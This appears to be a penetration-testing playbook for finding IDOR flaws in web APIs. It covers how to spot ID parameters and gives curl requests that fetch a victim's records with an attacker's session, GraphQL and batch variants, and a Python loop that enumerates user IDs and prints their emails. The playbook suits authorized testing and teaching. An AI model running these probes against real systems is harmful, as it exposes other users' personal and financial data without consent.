# Playbook: IDOR Testing Framework

## Purpose
Systematically test for Insecure Direct Object References across all
identified endpoints. Covers numeric IDs, GUIDs, hashed references,
and indirect object references.
Input: authenticated session, endpoint list, or specific endpoint URL.

---

## Step 1 — Setup: Create Two Test Accounts

Always test IDOR with two separate accounts at the same privilege level
unless testing vertical privilege escalation.

```
Account A (attacker)  : attacker@mailinator.com  → Session/token: SESS_A
Account B (victim)    : victim@mailinator.com     → Session/token: SESS_B
```

For vertical escalation testing:
```
Account LOW  (attacker) : regular user
Account HIGH (victim)   : admin/privileged user
```

---

## Step 2 — Identify Object Reference Points

Scan all collected endpoints and parameters for object references:

```bash
# From wayback/katana output — find URLs with IDs
grep -P "/(id|user|account|profile|order|invoice|ticket|message|document|file|report|item)/[0-9a-fA-F-]+" \
  urls_all.txt > idor_candidates_path.txt

# From parameters — find ID-type params
grep -iE "[?&](id|uid|user_id|account_id|profile_id|order_id|invoice_id|doc_id|file_id|message_id|customer_id|record_id|ref|object_id)=[0-9a-fA-F-]+" \
  urls_all.txt > idor_candidates_param.txt

cat idor_candidates_path.txt idor_candidates_param.txt | sort -u > idor_candidates.txt
echo "IDOR candidates: $(wc -l < idor_candidates.txt)"
```

---

## Step 3 — ID Type Identification & Enumeration Strategy

For each candidate, identify the ID type and plan enumeration:

| ID Type | Example | Strategy |
|---|---|---|
| Sequential integer | `?id=1234` | Try 1233, 1235, 1, 2, 0, -1 |
| UUID v4 | `?id=550e8400-e29b...` | Use victim's UUID directly |
| Hash (MD5/SHA1) | `?id=5f4dcc3b5aa...` | Hash of predictable values |
| Base64 encoded | `?id=dXNlcjoxMjM=` | Decode → modify → re-encode |
| Encoded integer | `?id=dXNlcjoxMjM=` | Try `user:1`, `user:2` etc |
| Opaque/HMAC | `?token=abc123sig` | Check if sig is validated |

```bash
# Detect encoding
echo "TARGET_ID" | base64 -d 2>/dev/null && echo "Base64"
echo "TARGET_ID" | python3 -c "import sys,hashlib; print(len(sys.stdin.read().strip()))" # 32=MD5, 40=SHA1
```

---

## Step 4 — Core IDOR Tests

For each identified endpoint, perform these tests:

### Test A — Horizontal IDOR (same role, different user)
```
1. Log in as Account A
2. Note Account A's object ID (profile ID, order ID, etc.)
3. Note Account B's object ID (from their session)
4. Using Account A's session → request Account B's object ID
5. If data returned → IDOR confirmed
```

```bash
# With curl
# Get resource as Account A
curl -sk "https://TARGET/api/users/VICTIM_ID" \
  -H "Authorization: Bearer SESS_A" \
  -H "Cookie: session=SESS_A"

# If response contains Account B's data → IDOR
```

### Test B — Vertical IDOR (low role accessing high-role resources)
```
1. Log in as low-privilege user
2. Identify admin-only endpoints from JS/API docs
3. Access those endpoints with low-privilege session
```

### Test C — Parameter Tampering (hidden ID fields)
```bash
# Intercept a request in Burp
# Look for IDs in:
# - Request body (JSON/form fields)
# - Hidden form fields
# - Cookies (user_id, account_id in cookie values)
# - JWT payload (decode and check sub, uid, account_id)
```

### Test D — Method-based IDOR
```bash
# Try different HTTP methods on the same endpoint
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  response=$(curl -sk -X $method "https://TARGET/api/resource/VICTIM_ID" \
    -H "Authorization: Bearer SESS_A" \
    -w "\n%{http_code}")
  echo "[$method] $response"
done
```

---

## Step 5 — Advanced IDOR Patterns

### Indirect Reference (hash/token lookup)
```bash
# If endpoint accepts a token instead of direct ID:
# 1. Get your own token
# 2. Understand how token maps to object
# 3. Try predictable token values for other objects
```

### JSON Array/Batch IDOR
```bash
# Some APIs accept arrays — try mixing your ID with victim's
curl -sk -X POST "https://TARGET/api/messages/batch" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer SESS_A" \
  -d '{"ids": [YOUR_ID, VICTIM_ID, VICTIM_ID_2]}'
```

### GraphQL IDOR
```bash
# Test direct field access
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer SESS_A" \
  -d '{
    "query": "{ user(id: \"VICTIM_ID\") { email phone address privateData } }"
  }'

# IDOR via nested object
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer SESS_A" \
  -d '{
    "query": "{ currentUser { friends { orders { items { price } } } } }"
  }'
```

### Export/Download IDOR
```bash
# Reports, invoices, exports — high impact
curl -sk "https://TARGET/api/export/invoice/VICTIM_INVOICE_ID.pdf" \
  -H "Authorization: Bearer SESS_A" \
  -o test_invoice.pdf
file test_invoice.pdf  # Check if PDF was actually returned
```

---

## Step 6 — Response Analysis

When testing, look for:

```
✅ IDOR confirmed if:
  - Response contains victim's PII (name, email, address, phone)
  - Response contains victim's financial data
  - File download contains victim's content
  - HTTP 200 with victim's data (not your own)
  - Modification/deletion affects victim's resource

❌ Not IDOR if:
  - Returns your own data regardless of ID
  - Returns generic 404/403
  - Returns empty/null response consistently
  - Same response regardless of ID value
```

---

## Step 7 — Mass IDOR Testing (Automation)

```python
# Simple sequential IDOR probe
import requests

SESSION_A = "your_token_here"
VICTIM_ID = 12345
BASE_URL = "https://target.com/api/users"

headers = {"Authorization": f"Bearer {SESSION_A}"}

for user_id in range(VICTIM_ID - 5, VICTIM_ID + 5):
    r = requests.get(f"{BASE_URL}/{user_id}", headers=headers)
    if r.status_code == 200 and "email" in r.text:
        print(f"[IDOR] ID {user_id}: {r.json().get('email')}")
```

---

## Output

```
ENDPOINT      : GET /api/v2/orders/{order_id}
ID TYPE       : Sequential integer
TEST TYPE     : Horizontal IDOR
ATTACKER      : Account A (order_id: 10045)
VICTIM        : Account B (order_id: 10046)
RESULT        : 200 OK — returned victim's order data including
                name, address, items, payment method last 4
SEVERITY      : HIGH
IMPACT        : Unauthorized access to any user's order history
EVIDENCE      : [attach request/response pair]
CVSS          : 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
NEXT STEP     : Load 03_reporting/report_writer.md
```
